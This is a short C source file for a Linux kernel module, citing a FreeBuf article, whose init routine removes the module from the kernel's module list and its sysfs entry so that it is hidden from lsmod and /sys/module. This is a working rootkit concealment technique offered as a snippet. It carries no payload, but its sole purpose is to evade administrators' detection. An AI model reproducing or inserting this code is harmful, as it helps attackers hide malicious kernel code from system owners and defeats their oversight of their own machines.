//link :http://www.freebuf.com/articles/system/54263.html
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
static int lkm_init(void)
{
    list_del_init(&__this_module.list);//hided in lsmod
    kobject_del(&THIS_MODULE->mkobj.kobj);//hided in /sys/module
    return 0;
}
static void lkm_exit(void)
{

}
module_init(lkm_init);
module_exit(lkm_exit);
